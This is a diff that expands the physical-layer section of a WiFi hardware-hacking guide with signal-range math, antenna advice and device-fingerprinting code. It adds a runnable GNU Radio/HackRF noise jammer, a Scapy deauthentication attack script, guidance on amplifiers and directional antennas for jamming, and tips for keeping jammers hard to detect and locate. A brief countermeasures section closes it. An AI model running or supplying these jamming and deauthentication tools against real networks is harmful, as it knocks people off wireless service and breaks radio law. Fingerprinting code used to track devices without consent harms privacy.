@@ -133,30 +133,442 @@ WiFi (IEEE 802.11) is one of the most ubiquitous wireless technologies in modern
 
 ### Physical Layer Attacks
 
+The physical (PHY) layer of WiFi represents the most fundamental attack surface, where radio frequency signals are transmitted and received. Hardware hackers can exploit various aspects of RF communications to perform reconnaissance, eavesdropping, denial of service, and even device identification without requiring any encryption keys.
+
 1. **RF Signal Analysis**
-   - **Signal Leakage**: Detecting WiFi traffic beyond intended boundaries
-   - **Antenna Coupling**: Capturing emissions with high-gain antennas
-   - **Signal Fingerprinting**: Identifying devices based on RF signatures
-   - **RF Emissions Analysis**: Side-channel information extraction
-   - **Tools**:
-     - Spectrum analyzers
-     - Software-defined radios (SDRs)
-     - WiFi analyzer applications
+
+   ```
+   Range Comparison for WiFi Signal Detection
+   
+                      Regular Client Device
+                             ↓
+   AP ------------------- 100m ------------------→
+    ↑
+   Access Point         SDR with High-Gain Antenna
+                             ↓
+   AP ----------------------------------------- 1-2km ------------→
+   ```
+
+   - **Signal Leakage**: WiFi signals typically extend far beyond their intended coverage area, creating opportunities for long-range eavesdropping.
+   
+     * **Range Estimation Formula**: Maximum detection distance can be calculated using the link budget equation:
+     
+       ```
+       Max Distance (km) = 10^((EIRP + RX_Gain - Sensitivity - 32.44 - 20*log10(freq_GHz))/20)
+       ```
+       
+       Where:
+       * EIRP = Transmitter power (dBm) + Antenna gain (dBi)
+       * RX_Gain = Receiver antenna gain (dBi)
+       * Sensitivity = Receiver sensitivity (dBm)
+       * freq_GHz = Operating frequency in GHz
+       
+       Example: A standard WiFi router (20 dBm, 3 dBi antenna) can be detected by an SDR with a 15 dBi antenna at -90 dBm sensitivity at approximately 1.4 km in open space.
+   
+   - **Antenna Coupling**: Strategic antenna placement can significantly enhance signal capture capabilities.
+     * **Directional Antennas**: Yagi antennas with 15+ dBi gain can capture WiFi signals from specific directions while rejecting interference from other sources
+     * **Helical Antennas**: Provide circular polarization that can better capture signals regardless of orientation
+     * **Cantennas**: Low-cost DIY waveguide antennas made from cans, offering 10-15 dBi gain
+     
+     ```
+     Built from common materials, cantennas are effective directional antennas:
+     
+     Materials:         Construction:           Complete:
+     +----------+       +----------+            +----------+
+     |          |       |    N     |            |    N     |
+     |  Metal   |       |   Type   |            |   Type   |
+     |   Can    |  →    | Connector|      →     | Connector|
+     |          |       |    |     |            |    |     |
+     |          |       |    |     |            |    |     |
+     +----------+       +----+-----+            +----+-----+
+                                                    ↓
+                                                To WiFi Card/SDR
+     ```
+   
+   - **Signal Fingerprinting**: Each WiFi device exhibits unique RF characteristics that can be used for identification.
+     * **Transient Analysis**: Capturing and analyzing the power-up and power-down transients of RF signals
+     * **Frequency Offset**: Measuring the deviation from the nominal center frequency
+     * **I/Q Imbalance**: Analyzing amplitude and phase imbalances in the in-phase and quadrature components
+     
+     Example Python code for basic device fingerprinting using GNU Radio data:
+     
+     ```python
+     import numpy as np
+     from scipy import signal
+     
+     def extract_fingerprint(iq_samples, sample_rate):
+         # Calculate frequency offset
+         freq_offset = calculate_frequency_offset(iq_samples, sample_rate)
+         
+         # Measure I/Q imbalance
+         i_samples = np.real(iq_samples)
+         q_samples = np.imag(iq_samples)
+         i_power = np.mean(np.square(i_samples))
+         q_power = np.mean(np.square(q_samples))
+         iq_imbalance = 10 * np.log10(i_power / q_power)
+         
+         # Calculate power-on transient duration
+         transient_duration = measure_transient(iq_samples, sample_rate)
+         
+         return {
+             "freq_offset_hz": freq_offset,
+             "iq_imbalance_db": iq_imbalance,
+             "transient_duration_us": transient_duration
+         }
+     ```
+   
+   - **RF Emissions Analysis**: Side-channel information can leak through unintended RF emissions.
+     * **Emission Types**: Digital electronics within WiFi devices generate unintentional emissions correlated with internal operations
+     * **Data Leakage**: High-speed data processing can create emissions that leak information about encryption operations
+     * **Detection Methods**: Near-field probes can capture emissions directly from circuit boards
+     
+     | Emission Source | Frequency Range | Information Leaked | Required Proximity |
+     |-----------------|-----------------|---------------------|--------------------|
+     | Crystal oscillators | Fundamental frequency ± harmonics | Device activity patterns | 2-5 meters |
+     | CPU/RAM bus | 100 MHz - 1 GHz | Data processing operations | 0.5-2 meters |
+     | Power supplies | Switching frequency + harmonics | Power consumption patterns | 1-3 meters |
+     | SoC/Baseband | 1-5 GHz | Internal data transfers | Direct board contact |
+   
+   - **Tools and Equipment**:
+     * **Spectrum Analyzers**: Essential for visualizing RF energy distribution across frequency ranges
+       * Budget option: RTL-SDR with GQRX or SDR# software (~$30)
+       * Mid-range: HackRF with Spectrum Analyzer software (~$300)
+       * Professional: Tektronix RSA306B or equivalent ($3,000+)
+     
+     * **Software-Defined Radios (SDRs)**: Versatile tools for capturing and analyzing WiFi signals
+       * Recommended models: HackRF One, YARD Stick One, USRP B210, BladeRF
+       * Essential software: GNU Radio, Inspectrum, Baudline
+       
+     * **WiFi Analyzer Applications**:
+       * Kismet: Network detection and packet capture
+       * Wireshark: Packet analysis with 802.11 dissectors
+       * Aircrack-ng: WiFi security assessment suite
 
 2. **Jamming and Interference**
-   - **Channel Jamming**: Continuous transmission on target frequencies
-   - **Selective Packet Jamming**: Targeting specific frames
-   - **Deauthentication Attacks**: Focused disruption of connections
+
+   WiFi is particularly vulnerable to various forms of jamming due to its operation in unlicensed bands and its mandatory carrier-sense mechanisms.
+   
+   ```
+   Packet Reception During Different Jamming Scenarios
+   
+   Normal:         [PKT1]   [PKT2]   [PKT3]   [PKT4]   [PKT5]
+   
+   Continuous:     [PKT-    ////////////////////////    -PKT5]
+                    Jamming starts      Jamming ends
+                    
+   Selective:      [PKT1]   [////]   [PKT3]   [////]   [PKT5]
+                           Targeted      Targeted
+   ```
+
+   - **Channel Jamming**: Broadcasting continuous signals on WiFi channels to prevent normal operation.
+     * **Implementation Approaches**:
+       * Tone Jamming: Single frequency transmission within the target channel
+       * Noise Jamming: Wideband noise covering the entire channel
+       * Sweep Jamming: Frequency sweep across the channel bandwidth
+     
+     * **Hardware Requirements**:
+       * Transmitter capable of sustained output (heat dissipation is critical)
+       * Linear amplifier to boost signal power (28-30 dBm typical for effective jamming)
+       * Adequate power supply (battery-powered jammers have limited operation time)
+     
+     * **Detection Avoidance**:
+       * Low-power distributed jammers are harder to locate than a single high-power source
+       * Intermittent jamming patterns can evade automated detection systems
+     
+     * **Python example using GNU Radio for a simple jammer**:
+     ```python
+     #!/usr/bin/env python3
+     from gnuradio import gr, analog, blocks
+     from gnuradio.filter import firdes
+     import osmosdr
+     
+     class WifiJammer(gr.top_block):
+         def __init__(self, freq=2437e6, sample_rate=20e6, tx_gain=47):
+             gr.top_block.__init__(self, "WiFi Channel Jammer")
+             
+             # Signal source - noise to jam channel
+             self.source = analog.noise_source_c(analog.GR_GAUSSIAN, 1.0, 0)
+             
+             # Output to SDR
+             self.sink = osmosdr.sink(args="hackrf=0")
+             self.sink.set_sample_rate(sample_rate)
+             self.sink.set_center_freq(freq)
+             self.sink.set_gain(tx_gain)
+             
+             # Connect blocks
+             self.connect(self.source, self.sink)
+     
+     if __name__ == '__main__':
+         jammer = WifiJammer()
+         jammer.start()
+         input("Press Enter to quit...")
+         jammer.stop()
+     ```
+   
+   - **Selective Packet Jamming**: Targeted disruption of specific frames based on real-time detection.
+     * **Reactive Jamming Process**:
+       1. Monitor the channel for specific packet types/patterns
+       2. Quickly detect the beginning of targeted packets
+       3. Switch to transmit mode and jam only during the target packet
+       4. Return to monitoring mode
+     
+     * **Critical Timing Requirements**:
+       * Detection to jamming transition must occur within microseconds
+       * Processing latency is the main challenge in reactive jammers
+       * Full-duplex radio capability significantly improves effectiveness
+     
+     * **Target Selection Strategies**:
+       * Management frames (particularly authentication/association)
+       * Control frames (ACKs, RTS/CTS)
+       * Data frames matching specific patterns (source/destination filters)
+     
+     | Frame Type | Jamming Effectiveness | System Impact | Detection Difficulty |
+     |------------|------------------------|---------------|----------------------|
+     | Beacon | High | Network discovery prevention | Low |
+     | Authentication | Very High | Connection establishment blocking | Medium |
+     | RTS/CTS | Medium | Throughput degradation | High |
+     | ACK | High | Forced retransmissions, throughput reduction | Very High |
+     | Data | Variable | Selective service disruption | Medium |
+   
+   - **Deauthentication Attacks**: Specifically targeting the connection management frames.
+     * **Attack Mechanism**:
+       * 802.11 management frames are not authenticated in most deployments
+       * Forged deauthentication frames cause clients to disconnect
+       * Can be selectively targeted at specific clients or broadcast to all
+     
+     * **Implementation with Scapy**:
+     ```python
+     #!/usr/bin/env python3
+     from scapy.all import *
+     import time
+     
+     def deauth_attack(target_mac, gateway_mac, iface="wlan0mon", count=10):
+         # 802.11 frame
+         # addr1: destination MAC
+         # addr2: source MAC
+         # addr3: Access Point MAC
+         pkt = RadioTap() / \
+               Dot11(type=0, subtype=12, addr1=target_mac,
+                     addr2=gateway_mac, addr3=gateway_mac) / \
+               Dot11Deauth(reason=7)
+         
+         print(f"Sending deauth to {target_mac}")
+         sendp(pkt, iface=iface, count=count, inter=0.1, verbose=1)
+     
+     # Example usage
+     target_client = "AA:BB:CC:DD:EE:FF"  # Client to deauthenticate
+     access_point = "11:22:33:44:55:66"   # AP MAC address
+     deauth_attack(target_client, access_point)
+     ```
+   
    - **Hardware Considerations**:
-     - Power amplifier requirements
-     - Directional antenna usage
-     - MAC address filtering bypass techniques
+     * **Power Amplifier Requirements**:
+       * Linear amplification is essential to maintain signal characteristics
+       * Class A or AB amplifiers preferred over more efficient Class C/D/E
+       * Heat dissipation is a critical design factor for sustained jamming
+       * Commercial options: Mini-Circuits ZHL series, RFMD amplifiers
+     
+     * **Directional Antenna Advantages**:
+       * Focuses jamming energy toward target while reducing collateral interference
+       * Reduces transmit power requirements (more battery efficient)
+       * Decreases probability of detection from non-target directions
+       * Recommended types: Patch, Yagi, Parabolic grid antennas
+     
+     * **MAC Address Filtering Bypass**:
+       * Most MAC filters are implemented at higher layers
+       * Physical layer attacks bypass these controls completely
+       * For targeted attacks, MAC randomization or specific MAC spoofing may be necessary
+       * Multiple virtual interfaces with different MACs can probe filter rules
 
 3. **Physical Layer Identification**
-   - **Clock Skew Analysis**: Identifying unique hardware timing characteristics
-   - **Preamble Manipulation**: Testing non-standard preambles for device behavior
-   - **Chipset Fingerprinting**: Identifying hardware based on peculiarities in signals
-   - **Detection Methods**: Specialized RF analysis tools, machine learning classifiers
+
+   Beyond the intended communication data, RF signals contain a wealth of unintentional characteristics that can uniquely identify hardware devices.
+   
+   ```
+   Clock Skew Fingerprinting Process
+   
+   ┌────────────┐     ┌────────────┐     ┌────────────┐     ┌────────────┐
+   │ Capture    │     │ Extract    │     │ Calculate  │     │ Compare to │
+   │ Beacon     │ → │ Timestamp  │ →  │ Clock Skew │ →  │ Reference  │
+   │ Frames     │     │ Field      │     │ Pattern    │     │ Database   │
+   └────────────┘     └────────────┘     └────────────┘     └────────────┘
+   ```
+
+   - **Clock Skew Analysis**: All digital devices have unique clock drift patterns that can be measured over time.
+     * **Measurement Process**:
+       1. Capture multiple beacon frames or other timestamped packets
+       2. Extract timestamp field values
+       3. Calculate differences between expected and actual arrival times
+       4. Plot skew patterns over time to create device fingerprint
+     
+     * **Effectiveness Factors**:
+       * Longer observation periods produce more reliable fingerprints
+       * Temperature changes affect clock behavior, creating potential confusion
+       * Most effective on lower-cost devices with less precise oscillators
+       * Can distinguish between identical device models with different hardware instances
+     
+     * **Implementation Example**:
+     ```python
+     import numpy as np
+     import matplotlib.pyplot as plt
+     from scapy.all import *
+     
+     def analyze_clock_skew(pcap_file, mac_address):
+         timestamps = []
+         beacon_times = []
+         
+         packets = rdpcap(pcap_file)
+         for pkt in packets:
+             if pkt.haslayer(Dot11Beacon) and pkt.addr2 == mac_address:
+                 # Extract timestamp from beacon (microseconds)
+                 beacon_timestamp = pkt[Dot11Beacon].timestamp
+                 # Record actual arrival time
+                 arrival_time = pkt.time
+                 
+                 timestamps.append(beacon_timestamp / 1000000)  # Convert to seconds
+                 beacon_times.append(arrival_time)
+         
+         # Calculate relative clock skew
+         if len(timestamps) > 1:
+             t0 = timestamps[0]
+             y0 = beacon_times[0]
+             
+             relative_skew = [(timestamps[i] - t0) - (beacon_times[i] - y0) 
+                              for i in range(len(timestamps))]
+             
+             plt.figure(figsize=(10, 6))
+             plt.plot(beacon_times, relative_skew)
+             plt.xlabel('Time (s)')
+             plt.ylabel('Clock Skew (s)')
+             plt.title(f'Clock Skew Analysis for {mac_address}')
+             plt.grid(True)
+             plt.show()
+             
+             # Calculate linear regression to find skew rate
+             slope, intercept = np.polyfit(beacon_times, relative_skew, 1)
+             print(f"Clock skew rate: {slope*1e6:.2f} ppm")
+             
+             return slope * 1e6  # Return clock skew in parts per million
+     ```
+   
+   - **Preamble Manipulation**: Testing device responses to non-standard preamble signals can reveal implementation differences.
+     * **Standard Preamble Structure**:
+       * 802.11 frames begin with specific preamble patterns for synchronization
+       * Legacy preambles differ from newer HT/VHT/HE preambles
+       * Chipsets have varying tolerance for malformed preambles
+     
+     * **Testing Methodology**:
+       1. Generate frames with slightly modified preamble patterns
+       2. Observe which devices still respond vs. which ignore the frames
+       3. Create a fingerprint based on response patterns to different modifications
+     
+     * **Modification Techniques**:
+       * Bit flipping in specific positions
+       * Timing variations between preamble segments
+       * Amplitude modulation of preamble elements
+       * Phase shifts in training fields
+   
+   - **Chipset Fingerprinting**: Identifying the specific WiFi chipset based on unique implementation characteristics.
+     * **Observable Characteristics**:
+       | Feature | Measurement Method | Example Distinctive Patterns |
+       |---------|-------------------|------------------------------|
+       | Supported rates | Probe vendor IEs | Broadcom vs. Atheros rate sets |
+       | Probe request patterns | Timing between probes | Intel uses systematic scanning, MediaTek more random |
+       | RTS/CTS usage | Frame capture analysis | Realtek more aggressive with RTS than Qualcomm |
+       | Transmit power control | Power measurements across packets | Characteristic step patterns differ by vendor |
+       | Channel switching time | Multi-channel monitoring | Intel switches faster than most MediaTek |
+     
+     * **RF Hardware Signatures**:
+       * Transmitter startup/shutdown envelope shapes
+       * Spectral masks and out-of-band emissions
+       * Phase noise characteristics
+       * Harmonic content and spurious emissions
+     
+     * **Example Fingerprinting Database Structure**:
+     ```json
+     {
+       "chipsets": [
+         {
+           "vendor": "Broadcom",
+           "model": "BCM43xx",
+           "signatures": {
+             "clock_skew": {"mean": 2.3, "std": 0.8},
+             "freq_offset": {"mean": 1243, "std": 325},
+             "power_ramp": [0.1, 0.3, 0.7, 0.9, 1.0],
+             "channel_switch_time_ms": {"mean": 5.2, "std": 0.7}
+           }
+         },
+         {
+           "vendor": "Qualcomm",
+           "model": "QCA9xxx",
+           "signatures": {
+             "clock_skew": {"mean": 1.1, "std": 0.3},
+             "freq_offset": {"mean": 756, "std": 198},
+             "power_ramp": [0.2, 0.5, 0.8, 1.0, 1.0],
+             "channel_switch_time_ms": {"mean": 3.8, "std": 0.4}
+           }
+         }
+       ]
+     }
+     ```
+   
+   - **Detection Methods**: Technical approaches to identify and classify WiFi devices.
+     * **Specialized RF Analysis Tools**:
+       * Commercial: Ellisys WiFi Analyzer, Tektronix SignalVu
+       * Open Source: GNURadio with custom IEEE 802.11 modules
+       * Hardware-specific: USRP with gr-ieee802-11
+     
+     * **Machine Learning Classifiers**:
+       * Feature extraction from raw I/Q samples
+       * Convolutional Neural Networks (CNN) applied to spectrograms
+       * Support Vector Machines (SVM) for classification based on extracted features
+       * Random Forest models for distinguishing device categories
+     
+     * **Multi-dimensional Analysis Approaches**:
+       * Combined time-domain and frequency-domain features
+       * Protocol behavior combined with RF characteristics
+       * Fingerprinting fusion: merging multiple identification techniques
+     
+     * **Basic PyTorch Example for RF Fingerprinting**:
+     ```python
+     import torch
+     import torch.nn as nn
+     import torch.optim as optim
+     
+     # Simple CNN for WiFi device classification
+     class RFFingerprinter(nn.Module):
+         def __init__(self, num_classes):
+             super(RFFingerprinter, self).__init__()
+             self.conv1 = nn.Conv1d(2, 64, kernel_size=7)  # I/Q channels
+             self.conv2 = nn.Conv1d(64, 128, kernel_size=5)
+             self.conv3 = nn.Conv1d(128, 128, kernel_size=3)
+             self.pool = nn.MaxPool1d(2)
+             self.dropout = nn.Dropout(0.5)
+             self.fc1 = nn.Linear(128 * 62, 256)  # Adjust size based on input dimension
+             self.fc2 = nn.Linear(256, num_classes)
+             
+         def forward(self, x):
+             # x shape: [batch, 2, samples] for I/Q data
+             x = self.pool(torch.relu(self.conv1(x)))
+             x = self.pool(torch.relu(self.conv2(x)))
+             x = self.pool(torch.relu(self.conv3(x)))
+             x = x.view(x.size(0), -1)  # Flatten
+             x = self.dropout(torch.relu(self.fc1(x)))
+             x = self.fc2(x)
+             return x
+     ```
+   
+**Countermeasures and Limitations**
+
+While physical layer attacks are powerful, several factors can limit their effectiveness:
+
+- **Protected Management Frames (PMF)**: 802.11w adds authentication to management frames, mitigating deauthentication attacks
+- **Randomized MAC Addresses**: Modern devices use temporary MAC addresses during scanning
+- **Beam Forming**: Directional transmission reduces signal leakage
+- **Hardware Randomization**: Some secure implementations add deliberate randomization to clock behavior
+- **Channel Agility**: Frequency hopping and dynamic channel selection can defeat single-channel jammers
+
+These countermeasures raise the bar but do not eliminate the attack surface, as the fundamental RF physics remain exploitable with sufficient technical resources.
 
 ### MAC and Baseband Vulnerabilities
 
